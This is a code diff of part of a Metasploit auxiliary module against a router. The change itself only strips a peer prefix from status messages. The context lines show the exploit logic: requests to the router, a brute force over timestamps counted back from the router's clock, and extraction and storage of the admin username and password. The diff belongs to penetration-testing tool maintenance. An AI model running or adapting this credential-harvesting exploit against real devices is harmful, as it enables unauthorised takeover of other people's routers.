@@ -180,16 +180,16 @@ class MetasploitModule < Msf::Auxiliary
     @q2 = Rex::Text.rand_text_alpha(rand(2..21))
 
     # let's try without timestamp first (the timestamp only gets set if the user visited the page before)
-    print_status("#{peer} - Trying the easy way out first")
+    print_status("Trying the easy way out first")
     res = send_req(nil)
     if res && res.code == 200
       credentials = get_creds
-      print_good("#{peer} - Success! Got admin username \"#{credentials[0]}\" and password \"#{credentials[1]}\"")
+      print_good("Success! Got admin username \"#{credentials[0]}\" and password \"#{credentials[1]}\"")
       return
     end
 
     # no result? let's just go on and bruteforce the timestamp
-    print_error("#{peer} - Well that didn't work... let's do it the hard way.")
+    print_error("Well that didn't work... let's do it the hard way.")
 
     # get the current date from the router and parse it
     end_time = get_current_time
@@ -207,8 +207,8 @@ class MetasploitModule < Msf::Auxiliary
       end_time = (datastore['TIME_SURPLUS'] * 7.5).to_i
     end
 
-    print_good("#{peer} - Got time #{end_time} from router, starting exploitation attempt.")
-    print_status("#{peer} - Be patient, this might take a long time (typically a few minutes, but it might take hours).")
+    print_good("Got time #{end_time} from router, starting exploitation attempt.")
+    print_status("Be patient, this might take a long time (typically a few minutes, but it might take hours).")
 
     # work back from the current router time minus datastore['TIME_OFFSET']
     loop do
@@ -216,13 +216,13 @@ class MetasploitModule < Msf::Auxiliary
         timestamp = get_timestamp(time)
         sleep 0.1
         if time % 400 == 0
-          print_status("#{peer} - Still working, trying time #{time}")
+          print_status("Still working, trying time #{time}")
         end
         res = send_req(timestamp)
         next unless res && res.code == 200
 
         credentials = get_creds
-        print_good("#{peer} - Success! Got admin username \"#{credentials[0]}\" and password \"#{credentials[1]}\"")
+        print_good("Success! Got admin username \"#{credentials[0]}\" and password \"#{credentials[1]}\"")
         store_valid_credential(user: credentials[0], private: credentials[1]) # more consistent service_name and protocol, now supplies ip and port
         return
       end
@@ -234,7 +234,7 @@ class MetasploitModule < Msf::Auxiliary
         end
         start_time = 0
       end
-      print_status("#{peer} - Going for another round, finishing at #{start_time} and starting at #{end_time}")
+      print_status("Going for another round, finishing at #{start_time} and starting at #{end_time}")
 
       # let the router clear the buffers a bit...
       sleep 30
